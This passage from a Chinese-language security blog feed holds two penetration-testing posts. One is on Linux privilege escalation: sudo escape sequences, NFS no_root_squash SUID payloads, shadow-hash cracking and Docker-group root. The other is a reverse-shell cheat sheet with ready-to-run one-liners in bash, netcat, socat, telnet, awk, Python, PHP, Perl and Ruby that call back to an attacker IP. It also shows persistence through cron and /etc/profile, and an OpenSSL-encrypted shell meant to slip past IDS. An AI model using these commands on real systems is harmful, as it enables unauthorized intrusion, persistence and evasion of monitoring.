class="comment"># 返回root shell</span></span><br></pre></td></tr></table></figure></li><li><p>man</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo man man</span><br><span class="line">!</span><br><span class="line">(enter) <span class="comment"># 返回root shell</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="外壳逃生序列"><a href="#外壳逃生序列" class="headerlink" title="外壳逃生序列"></a>外壳逃生序列</h2><p>即使没有”明显”的方法来升级特权，我们也可以使用外壳逃生序列。</p><p>即使我们仅限于通过sudo运行某些程序，有时也有可能”逃避”程序并生成壳。<br>由于初始程序具有root权限运行，因此生成的外壳也是如此。<br>此处可以找到带有外壳逃生序列的程序列表：<a href="https://gtfobins.github.io/">https://gtfobins.github.io</a></p><h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><ol><li>列出允许用户运行的程序<br><code>sudo -l</code></li></ol><p><img src="/simg/Linux_Privilege_Escalation.png" alt=" "></p><ol start="2"><li><p>对每个程序进行查表，要细心<br><a href="https://gtfobins.github.io/">GTFObins</a></p></li><li><p>如果存在逃生序列，则通过sudo 运行程序并执行序列以生成根壳。</p></li></ol><h1 id="NFS提权"><a href="#NFS提权" class="headerlink" title="NFS提权"></a>NFS提权</h1><h2 id="简介-3"><a href="#简介-3" class="headerlink" title="简介"></a>简介</h2><p>NFS（网络文件系统）是一种分布式文件系统协议，NFS允许系统通过网络与其他人共享目录和文件。<br>在NFS文件共享中，用户甚至程序可以访问远程系统上的信息，就像它们驻留在本地计算机上一样。<br>NFS中的Root Squashing（root_sqaush）参数阻止对连接到NFS卷的远程root用户具有root访问权限。当该参数设置为no_root_squash时，登入 NFS 主机使用分享目录的使用者如果是 root 的话，那么对于这个分享的目录来说，他就具有 root 的权限，基于此原理便可实现提权。</p><p>NFS共享在&#x2F;etc&#x2F;exports文件中配置。<br>远程用户可以安装共享、访问、创建、修改文件。<br>默认情况下，创建的文件会继承remote用户的ID和组ID(分别作为所有者和组)，即使它们不存在 NFS 服务器上。</p><h2 id="相关命令-1"><a href="#相关命令-1" class="headerlink" title="相关命令"></a>相关命令</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">showmount -e &lt;target&gt; <span class="comment"># 显示NFS服务器的导出列表</span></span><br><span class="line">nmap -sV -script=nfs-showmount &lt;target&gt; <span class="comment"># 类似的nmap脚本</span></span><br><span class="line">mount -o rw,vers=2 &lt;target&gt;:&lt;share&gt; &lt;local_directory&gt; <span class="comment"># 安装NFS共享</span></span><br></pre></td></tr></table></figure><p><strong>Root Squashing</strong><br>Root Squashing是 NFS如何防止明显的特权升级。<br>如果远程用户是(或声称是)root(uid&#x3D;0)，NFS将改为”squash”用户，就好像他们是”nobody”用户一样，在”nogroup”组中。<br>虽然此行为是默认的，但它可以禁用！</p><p><strong>no_root_squash</strong><br>no_root_squash是一个 NFS 配置选项，它关闭root的squash。<br>当包含在可写入的共享配置中时，识别为”root”的远程用户可以作为本地根用户在 NFS 共享上创建文件。</p><h2 id="实操-1"><a href="#实操-1" class="headerlink" title="实操"></a>实操</h2><ol><li><p>检查 &#x2F;etc&#x2F;exports 的内容，了解具有no_root_squash选项的配置：<br><code>cat /etc/exports</code></p></li><li><p>确认NFS共享可用于远程安装：<br><code>showmount -e 192.168.1.25</code></p></li><li><p>在kali上创建一个文件夹，并安装&#x2F;tmp NFS共享：<br><code>mkdir /tmp/nfs mount -o rw,vers=2 192.168.175.228:/tmp /tmp/nfs</code></p></li><li><p>使用kali上的root用户生成有效载荷并将其保存到安装的共享中：<br><code>msfvenom -p linux/x86/exec CMD=&quot;/bin/bash -p&quot; -f elf -o /tmp/nfs/shell.elf</code></p></li><li><p>确保文件具有SUID集，并且每个用户都可执行：<br><code>chmod +xs /tmp/nfs/shell.elf</code></p></li><li><p>在目标机器上。执行文件以获取root：<br><code>/tmp/shell.elf bash-4.1</code></p></li></ol><h1 id="password-amp-key-提权"><a href="#password-amp-key-提权" class="headerlink" title="password &amp; key 提权"></a>password &amp; key 提权</h1><h2 id="简介-4"><a href="#简介-4" class="headerlink" title="简介"></a>简介</h2><ol><li>密码<br>虽然这看起来可能很漫长，但弱密码存储和密码重复使用可能是升级权限的简单方法。<br>虽然root用户的帐户密码被隐藏起来，并安全地存储在&#x2F;etc&#x2F;shadow中<br>但其他密码（如用于服务的密码）可能会 以普通文本存储在配置文件中。<br>如果根用户将密码重新用于服务，则可能会找到该密码并用于切换到根用户。</li></ol><p>大多数linux系统的密码都和&#x2F;etc&#x2F;passwd和&#x2F;etc&#x2F;shadow这两个配置文件息息相关。passwd里面储存了用户，shadow里面是密码的hash。出于安全考虑passwd是全用户可读，root可写的。shadow是仅root可读写的。<br>当我们的passwd和shadow一些权限配置不当就可能会导致提权</p><p><strong>passwd文件</strong><br><code>test:x:1000:1000::/home/test:/bin/bash</code><br>passwd 由冒号分割，第一列是用户名，第二列是密码，x 代表密码 hash 被放在 shadow 里面了（非root用户不可读）。<br>当我们的passwd文件给普通用户配置了写权限，那么我们就可以通过修改x为一段已知的密码的hash值来进行提权。</p><p><strong>shadow文件</strong><br><code>test:$6$Mqh9T8ip$4Ev.HJTBdyobrYaW/KzBlL0yx6wefeB.VDcE7KiDiwoUvGkqShU9jRK4cEZA2kBRsyH2fWjmbxc/ZyVWfXwFJ/:18849:0:99999:7:::</code><br>假如我们对shadow文件有读取权限我们就可以利用hash、john等对其进行爆破<br>这里以john为例进行演示，首先把passwd和shadow两文件放在同一文件下</p><p>然后进行破解<br><code>john --user=test test.hash</code></p><ol start="2"><li>历史文件<br>历史文件记录用户在使用某些程序时发出的命令。<br>如果用户将密码键入命令的一部分，此密码可能会存储在历史记录文件中。<br>尝试使用发现ed 密码切换到根</li></ol><h2 id="实操-2"><a href="#实操-2" class="headerlink" title="实操"></a>实操</h2><ol><li>查看用户&#x2F;home目录中隐藏文件的内容，文件名以“历史记录”结尾：<br><code>cat ~/.*history | less</code></li></ol><p>两次q退出来<br>似乎连接到MySQL服务器的用户<br><code>rootpassword123</code></p><ol start="2"><li>su登录<br><img src="/simg/Linux_Privilege_Escalation_3.png" alt=" "></li></ol><h1 id="Docker提权"><a href="#Docker提权" class="headerlink" title="Docker提权"></a>Docker提权</h1><p>除了利用Linux系统自带的工具进行提权，还可以利用大量存在风险的第三方工具进行提权，本文以Docker为例进行演示。 随着云化时代的来临，docker也越来越流行，在很多公司内部的linux机器上docker已然成了标配。Docker使用便捷，有以下几个特性：</p><p>（1）可免sudo使用docker：默认情况下使用docker必须要有sudo权限，对于一台机器多用户使用，往往很多用户只有普通权限。为了让普通用户也可以使用Docker，管理员将需要使用docker的用户添加到docker用户组(安装docker后默认会创建该组)中，用户重新登录机器即可免sudo使用docker了。</p><p>（2）容器内用户权限不受限：用户创建一个docker容器后，容器内默认是root账户，在不需要加sudo的情况下可以任意更改容器内的配置。正常情况下，这种模式既可以保证一台机器被很多普通用户使用，通过docker容器的隔离，相互之前互不影响；也给用户在容器内开放了充足的权限保证用户可以正常安装软件，修改容器配置等操作。</p><p>（3）容器内外文件可映射：docker提供了一个-v选项，提供用户将容器外的host目录映射进容器内，方便的进行容器内外的文件共享。</p><p>结合上面三个特点，可以实现用户提权操作。</p><ol><li><p>用户配置<br>使用管理员新建一个普通用户user_docker，并将其添加到docker组中：<br><code>sudo gpasswd -a user_docker docker</code></p></li><li><p>提权操作<br>通过前期的渗透操作，拿下user_docker的权限，下面对其进行提权。<br>首先，运行一个容器：<br><code>docker run -it -v /etc:/etc ubuntu /bin/bash</code><br>将宿主机的&#x2F;etc目录直接映射进容器，从而覆盖了容器内的&#x2F;etc目录。<br>由于linux系统上的本地用户信息主要记录在&#x2F;etc&#x2F;目录下，比如两个常见文件&#x2F;etc&#x2F;passwd和&#x2F;etc&#x2F;group，而在容器内当前用户有root权限，于是可以随意修改这两个文件，实现提权：</p></li></ol><p>修改&#x2F;etc&#x2F;passwd文件，可更改root密码，或者新增一个uid&#x3D;0的用户。</p><p>修改&#x2F;etc&#x2F;group文件，将当前用户添加到sudo组中。</p><p>本文演示第二种方法，在容器内执行下列命令：<br><code>usermod -aG sudo user_docker</code><br>将user_docker用户加载到sudo组中，而后退出容器。</p><p>查看宿主机文件&#x2F;etc&#x2F;group，可见user_docker已经拥有sudo权限，提权成功！</p><p>除此之外，DockerHub上已经有人将exp打包成镜像rootplease 。<br>只要用户在 docker 组中，运行下面命令就能直接在 docker 中获取到 root 权限:<br><code>docker run -v /:/hostOS -it chrisfosterelli/rootplease</code><br>容器生成后自动获取到宿主机的 root 权限，并启动 shell 程序，直接在 docker 中执行命令。</p><p>在这种多用户借助docker共用一台机器的情况下，普通用户可以借助docker提升为sudo用户，从而可以进行任意修改系统配置等各种恶意操作。<br>以上是本地用户的破坏还不是很明显，毕竟是公司内部用户大多不会进行恶意操作。然而，很多情况下普通用户为了方便，用户密码往往设置得很简单，如果攻击者通过其他途径暴力破解普通用户弱口令，就可以很轻松得提示为管理员从事不可限制的恶意操作，这也大大降低了攻击者的攻击难度。</p><h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.nsfocus.net/linux/">LINUX提权手法实践</a><br><a href="https://www.cnblogs.com/sfsec/p/15163907.html">Linux提权总结</a><br><a href="https://www.freebuf.com/articles/system/362070.html">Linux提权姿势总结</a><br><a href="https://www.freebuf.com/articles/web/280398.html">手把手教你Linux提权</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;Linux提权方式的复习与学习。&lt;/p&gt;</summary>
    
    
    
    <category term="内网渗透" scheme="http://example.com/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    <category term="提权" scheme="http://example.com/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%8F%90%E6%9D%83/"/>
    
    
    <category term="内网渗透" scheme="http://example.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>内网渗透之反弹shell</title>
    <link href="http://example.com/2023/08/28/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E5%8F%8D%E5%BC%B9shell/"/>
    <id>http://example.com/2023/08/28/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E5%8F%8D%E5%BC%B9shell/</id>
    <published>2023-08-27T16:00:00.000Z</published>
    <updated>2023-08-28T08:33:45.181Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>以前学过的内容，记录一遍。</p><span id="more"></span><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>反弹shell，就是攻击机监听在某个TCP&#x2F;UDP端口为服务器，目标机主动发起请求到攻击机监听的端口，并将其命令行的输入输出转到攻击机。</p><h1 id="正向连接"><a href="#正向连接" class="headerlink" title="正向连接"></a>正向连接</h1><p>假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面、web服务、ssh、telnet等等都是正向连接。</p><h1 id="反向连接"><a href="#反向连接" class="headerlink" title="反向连接"></a>反向连接</h1><p>反弹shell通常适用于如下几种情况：<br>目标机因防火墙受限，目标机器只能发送请求，不能接收请求。<br>目标机端口被占用。<br>目标机位于互联网，或IP会动态变化，攻击机无法连接。<br>对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机，都是未知。</p><p>对于以上几种情况，我们是无法利用正向连接的，要用反向连接。</p><p>反向连接就是，攻击者指定服务端，受害者主机主动连接攻击者的服务端程序。</p><p>反弹shell的方式有很多，那具体要用哪种方式还需要根据目标主机的环境来确定，比如目标主机上如果安装有netcat，那我们就可以利用netcat反弹shell，如果具有python环境，那我们可以利用python反弹shell。如果具有php环境，那我们可以利用php反弹shell。</p><h1 id="利用netcat反弹shell"><a href="#利用netcat反弹shell" class="headerlink" title="利用netcat反弹shell"></a>利用netcat反弹shell</h1><p>Netcat 是一款简单的Unix工具，使用UDP和TCP协议。 它是一个可靠的容易被其他程序所启用的后台操作工具，同时它也被用作网络的测试工具或黑客工具。 使用它你可以轻易的建立任何连接。</p><p>目前，默认的各个linux发行版本已经自带了netcat工具包，但是可能由于处于安全考虑原生版本的netcat带有可以直接发布与反弹本地shell的功能参数 -e 都被阉割了，所以我们需要自己手动下载二进制安装包，安装的如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wget https://nchc.dl.sourceforge.net/project/netcat/netcat/0.7.1/netcat-0.7.1.tar.gz</span><br><span class="line">tar -xvzf netcat-0.7.1.tar.gz</span><br><span class="line">./configure</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line">make clean</span><br></pre></td></tr></table></figure><p>安装完原生版本的 netcat 工具后，便有了netcat -e参数，我们就可以将本地bash反弹到攻击机上了。</p><p>攻击机开启本地监听：<br><code>netcat -lvvp 2333</code></p><p>目标机主动连接攻击机：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">netcat 47.xxx.xxx.72 2333 -e /bin/bash</span><br><span class="line"><span class="comment"># nc &lt;攻击机IP&gt; &lt;攻击机端口&gt; -e /bin/bash</span></span><br></pre></td></tr></table></figure><h1 id="利用bash反弹shell"><a href="#利用bash反弹shell" class="headerlink" title="利用bash反弹shell"></a>利用bash反弹shell</h1><p>使用bash结合重定向方法的一句话反弹shell命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/47.xxx.xxx.72/2333 0&gt;&amp;1</span><br><span class="line">或</span><br><span class="line">bash -c <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/47.xxx.xxx.72/2333 0&gt;&amp;1&quot;</span></span><br><span class="line"><span class="comment"># bash -i &gt;&amp; /dev/tcp/攻击机IP/攻击机端口 0&gt;&amp;1</span></span><br></pre></td></tr></table></figure><p>命令详解：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">bash -i  <span class="comment"># 产生一个bash交互环境</span></span><br><span class="line">&gt;&amp;       <span class="comment"># 将联合符号前面的内容与后面的内容相结合，然后一起重定向给后者</span></span><br><span class="line">/dev/tcp/47.xxx.xxx.72/2333  </span><br><span class="line"><span class="comment"># Linux环境中所有内容都是以文件的形式存在的，</span></span><br><span class="line"><span class="comment"># 该命令是让目标主机与攻击机47.xxx.xxx.72的2333端口建立一个tcp连接。</span></span><br><span class="line">0&gt;&amp;1     <span class="comment"># 将标准输入与标准输出的内容相结合，然后重定向给前面标准输出的内容</span></span><br></pre></td></tr></table></figure><p>完整解读：<br>bash产生了一个交互环境和本地主机主动发起与攻击机2333端口建立的连接（即TCP 2333会话连接）相结合，然后在重定向个TCP 2333会话连接，最后将用户键盘输入与用户标准输出相结合再次重定向给一个标准的输出，即得到一个bash反弹环境。</p><p>攻击机开启监听：<br><code>nc -lvvp 2333</code></p><p>目标机主动连接攻击机<br><code>bash -i &gt;&amp; /dev/tcp/47.xxx.xxx.72/2333 0&gt;&amp;1</code></p><h1 id="Curl配合bash反弹shell"><a href="#Curl配合bash反弹shell" class="headerlink" title="Curl配合bash反弹shell"></a>Curl配合bash反弹shell</h1><p>这里的操作借助了Linux中的管道。</p><p>首先，在攻击者vps的web目录里面创建一个index文件（index.php或index.html），内容如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/47.xxx.xxx.72/2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>并开启2333端口监听<br>然后在目标机上执行如下，即可反弹shell：<br><code>curl 47.xxx.xxx.72|bash</code></p><p><code>curl IP|bash</code> 中的IP可以是任意格式的，十进制，十六进制，二进制等。</p><h1 id="将反弹shell命令写入定时任务"><a href="#将反弹shell命令写入定时任务" class="headerlink" title="将反弹shell命令写入定时任务"></a>将反弹shell命令写入定时任务</h1><p>我们可以在目标主机的定时任务文件中写入一个反弹shell的脚本，但是前提是我们必须要知道目标主机当前的用户名是哪个。因为我们的反弹shell命令是要写在 <code>/var/spool/cron/[crontabs]/&lt;username&gt;</code> 内的，所以必须要知道远程主机当前的用户名。否则就不能生效。<br>比如，当前用户名为root，我们就要将下面内容写入到 <code>/var/spool/cron/root</code> 中。(centos系列主机)<br>比如，当前用户名为root，我们就要将下面内容写入到 <code>/var/spool/cron/crontabs/root</code> 中。(Debian&#x2F;Ubuntu系列主机)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/47.xxx.xxx.72/2333 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 每隔一分钟，向47.xxx.xxx.72的2333号端口发送shell</span></span><br></pre></td></tr></table></figure><h1 id="将反弹shell的命令写入-x2F-etc-x2F-profile文件"><a href="#将反弹shell的命令写入-x2F-etc-x2F-profile文件" class="headerlink" title="将反弹shell的命令写入&#x2F;etc&#x2F;profile文件"></a>将反弹shell的命令写入&#x2F;etc&#x2F;profile文件</h1><p>将以下的反弹shell命令写入&#x2F;etc&#x2F;profile文件中，&#x2F;etc&#x2F;profile中的内容会在用户打开bash窗口时执行。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash -i &gt;&amp; /dev/tcp/47.xxx.xxx.72/2333 0&gt;&amp;1 &amp;</span><br><span class="line"><span class="comment"># 最后面的&amp;为的是防止管理员无法输入命令</span></span><br></pre></td></tr></table></figure><p>当目标主机管理员远程连接该主机时，就会执行该命令，成功获得目标机的shell</p><h1 id="利用Socat反弹shell"><a href="#利用Socat反弹shell" class="headerlink" title="利用Socat反弹shell"></a>利用Socat反弹shell</h1><p>Socat是Linux下一个多功能的网络工具，名字来由是”Socket CAT”，因此可以看出它是基于socket的，其功能与netcat类似，可以看作netcat的加强版。<br><a href="http://brieflyx.me/2015/linux-tools/socat-introduction/">SOCAT 简介</a></p><p>安装socat的方法很简单：<br>Ubuntu等可以直接使用 <code>apt-get install socat</code> 命令进行安装<br>也可在 <a href="http://www.dest-unreach.org/socat/">官网</a> 下源码包</p><p>攻击机开启监听：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">socat TCP-LISTEN:2333 -</span><br><span class="line">或</span><br><span class="line">nc -lvvp 2333</span><br></pre></td></tr></table></figure><p>目标机主动连接攻击机：<br><code>socat tcp-connect:47.xxx.xxx.72:2333 exec:&#39;bash -li&#39;,pty,stderr,setsid,sigint,sane</code></p><h1 id="利用Telnet反弹shell"><a href="#利用Telnet反弹shell" class="headerlink" title="利用Telnet反弹shell"></a>利用Telnet反弹shell</h1><p>当nc和&#x2F;dev&#x2F;tcp不可用，且目标主机和攻击机上支持Telnet服务时，我们可以用Telnet反弹shell</p><p>方法一：<br>攻击机开启本地监听：<br><code>nc -lvvp 2333</code></p><p>目标机主动连接攻击机：<br><code>mknod a p; telnet 47.xxx.xxx.72 2333 0&lt;a | /bin/bash 1&gt;a</code></p><p>方法二：<br>攻击机需要开启两个本地监听：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 2333</span><br><span class="line">nc -lvvp 4000</span><br></pre></td></tr></table></figure><p>目标机主动连接攻击机：<br><code>telnet 47.101.57.72 2333 | /bin/bash | telnet 47.101.57.72 4000</code></p><p>获得shell后，在攻击机2333端口的终端上输入的命令会在目标机上执行，执行的回显将通过4000端口的终端显示出来。</p><h1 id="利用awk反弹shell"><a href="#利用awk反弹shell" class="headerlink" title="利用awk反弹shell"></a>利用awk反弹shell</h1><p>AWK 是一种处理文本文件的语言，是一个强大的文本分析工具。在众多的Linux发行版本中，都会预装这个应用程序。<br>攻击机开启本地监听：<br><code>nc -lvvp 2333</code></p><p>目标机主动连接攻击机：<br><code>awk &#39;BEGIN&#123;s=&quot;/inet/tcp/0/47.xxx.xxx.72/2333&quot;;for(;s|&amp;getline c;close(c))while(c|getline)print|&amp;s;close(s)&#125;&#39;</code></p><h1 id="各种脚本反弹shell"><a href="#各种脚本反弹shell" class="headerlink" title="各种脚本反弹shell"></a>各种脚本反弹shell</h1><h2 id="python脚本反弹shell"><a href="#python脚本反弹shell" class="headerlink" title="python脚本反弹shell"></a>python脚本反弹shell</h2><p>当目标主机上有python环境时，我们可以用Python来反弹shell。Python在现在一般发行版Linux系统中都会自带，所以使用起来也较为方便，即使没有安装，我们手动安装也很方便。</p><p>攻击机开启本地监听：<br><code>nc -lvvp 2333</code></p><p>目标主机主动连接攻击机：<br><code>python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;47.xxx.xxx.72&quot;,2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;</code></p><h2 id="PHP脚本反弹shell"><a href="#PHP脚本反弹shell" class="headerlink" title="PHP脚本反弹shell"></a>PHP脚本反弹shell</h2><p>当目标主机上有phph环境时，我们可以用php来反弹shell。</p><p>攻击机开启本地监听：<br><code>nc -lvvp 2333</code></p><p>目标机主动连接攻击机：<br><code>php -r &#39;$sock=fsockopen(&quot;47.xxx.xxx.72&quot;,2333);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</code></p><h2 id="Perl脚本反弹shell"><a href="#Perl脚本反弹shell" class="headerlink" title="Perl脚本反弹shell"></a>Perl脚本反弹shell</h2><p>当目标主机上有perl环境时，我们可以用perl来反弹shell。</p><p>攻击机开启本地监听：<br><code>nc -lvvp 2333</code></p><p>目标机主动连接攻击机：<br><code>perl -e &#39;use Socket;$i=&quot;47.101.57.72&quot;;$p=2333;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#39;</code></p><h2 id="Ruby脚本反弹shell"><a href="#Ruby脚本反弹shell" class="headerlink" title="Ruby脚本反弹shell"></a>Ruby脚本反弹shell</h2><p>当目标主机上有ruby环境时，我们可以用ruby来反弹shell。</p><p>攻击机开启本地监听：<br><code>nc -lvvp 2333</code></p><p>目标机主动连接攻击机：<br><code>ruby -rsocket -e &#39;c=TCPSocket.new(&quot;47.xxx.xxx.72&quot;,&quot;2333&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#39; 或 ruby -rsocket -e &#39;exit if fork;c=TCPSocket.new(&quot;47.xxx.xxx.72&quot;,&quot;2333&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#39;</code></p><h1 id="使用Metasploit生成反弹shell用的一句话"><a href="#使用Metasploit生成反弹shell用的一句话" class="headerlink" title="使用Metasploit生成反弹shell用的一句话"></a>使用Metasploit生成反弹shell用的一句话</h1><p>强大的Metasploit框架也为我们提供了生成一句话反弹shell的工具，即msfvenom，绝对的实用。当我们不记得前面说的所有反弹shell的反弹语句时，只要我们有Metasploit，那么我们随时都可以使用 <code>msfvenom -l</code> 来查询生成我们所需要的各类命令行一句话，具体使用方法如下。</p><p>我们可以直接使用 <code>msfvenom -l</code> 结合关键字过滤（如cmd&#x2F;unix&#x2F;reverse），列出我们需要生成的各类反弹shell一句话的payload：<br><code>msfvenom -l payloads | grep &#39;cmd/unix/reverse&#39;</code></p><p>metasploit支持生成反弹shell一句话的类型非常丰富，可以依据渗透测试对象自行选择使用。比如，我们获取一个python反弹shell的一句话：<br><code>msfvenom -p cmd/unix/reverse_python LHOST=47.xxx.xxx.72 LPORT=2333 -f raw</code></p><p>将生成的python反弹shell的一句话在目标主机上执行即可</p><h1 id="反弹shell后获取模拟终端"><a href="#反弹shell后获取模拟终端" class="headerlink" title="反弹shell后获取模拟终端"></a>反弹shell后获取模拟终端</h1><p>其实，上面所讲的各种方法获取的shell都不是一个标准的虚拟终端环境，它仅仅是一个标准输入。你会发现存在一个问题，就是即使我们获取了目标虚拟终端控制权限，但是往往会发现其交互性非常的差，回显信息与可交互性非常的差和不稳定，具体见情况有以下几个种。</p><ul><li>获取的虚拟终端没有交互性，我们想给添加的账号设置密码或执行sudo等命令，无法完成。</li><li>标准的错误输出无法显示，无法正常使用vim等文本编辑器等。</li><li>获取的目标主机的虚拟终端使用非常不稳定，很容易断开连接。</li></ul><p>这往往都是因为我们获取的shell并不是标准的虚拟终端，为了能够完成输入密码等操作，我们必须模拟一个真正的终端设备。</p><p>我们其实可以借助于python默认包含的一个pty标准库来获取一个标准的虚拟终端环境。</p><p>只需在获取的shell里面输入如下命令，即可模拟一个终端设备：<br><code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code></p><p><img src="/simg/shell-1.png" alt="模拟终端设备"></p><p>如上图所示，成功模拟在shell中出了一个终端设备，并成功执行了sudo等命令。</p><h1 id="使用OpenSSL反弹加密shell"><a href="#使用OpenSSL反弹加密shell" class="headerlink" title="使用OpenSSL反弹加密shell"></a>使用OpenSSL反弹加密shell</h1><p>在上文中，我们总结了很多反弹shell得方法，但是我发现这种反弹 shell 方式都有一个缺点，那就是所有的流量都是明文传输的。这些通过shell通过传输的流量都可以被管理员直接抓取并理解，当目标主机网络环境存在网络防御检测系统时（IDS、IPS等），网络防御检测系统会获取到我们的通信内容并进行告警和阻止。因此，我们需要对通信的内容进行混淆或加密，这时可以选择使用 OpenSSL 反弹一个加密的 shell。</p><h2 id="OpenSSL简介"><a href="#OpenSSL简介" class="headerlink" title="OpenSSL简介"></a>OpenSSL简介</h2><p>在计算机网络上，OpenSSL 是一个开放源代码的软件库包，应用程序可以使用这个包来进行安全通信，避免窃听，同时确认另一端连接者的身份。</p><p>SSL协议要求建立在可靠的传输层协议(TCP)之上。SSL协议的优势在于它是与应用层协议独立无关的，高层的应用层协议(例如：HTTP，FTP，TELNET等)能透明地建立于SSL协议之上。SSL协议在应用层协议通信之前就已经完成加密算法、通信密钥的协商及服务器认证工作。在此之后应用层协议所传送的数据都会被加密，从而保证通信的私密性。</p><p>在利用 OpenSSL 反弹 shell 之前需要先生成自签名证书：<br><code>openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes</code></p><p>生成自签名证书时会提示输入证书信息，如果懒得填写可以一路回车即可</p><h2 id="使用OpenSSL反弹加密shell-1"><a href="#使用OpenSSL反弹加密shell-1" class="headerlink" title="使用OpenSSL反弹加密shell"></a>使用OpenSSL反弹加密shell</h2><p>实验环境：Linux</p><p>目标机：<br>系统：Linux<br>IP：192.168.1.8</p><p>攻击机：<br>系统：Linux<br>IP：47.xxx.xxx.72</p><p>假设我们从目标机反弹 shell 到攻击机 。首先需要利用上一步生成的自签名证书，在攻击机上使用 OpenSSL 监听一个端口，在这里使用 2333 端口：<br><code>openssl s_server -quiet -key key.pem -cert cert.pem -port 2333</code></p><p>此时 OpenSSL 便在攻击机的 2333 端口上启动了一个 SSL&#x2F;TLS server。</p><p>这时在目标机进行反弹 shell 操作，命令为：<br><code>mkfifo /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quite -connect 47.xxx.xxx.72:2333 &gt; /tmp/s; rm /tmp/s</code></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;以前学过的内容，记录一遍。&lt;/p&gt;</summary>
    
    
    
    <category term="内网渗透" scheme="http://example.com/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    <category term="反弹shell" scheme="http://example.com/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%8F%8D%E5%BC%B9shell/"/>
    
    
    <category term="内网渗透" scheme="http://example.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>Windows内网渗透之域渗透</title>
    <link href="http://example.com/2023/08/25/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
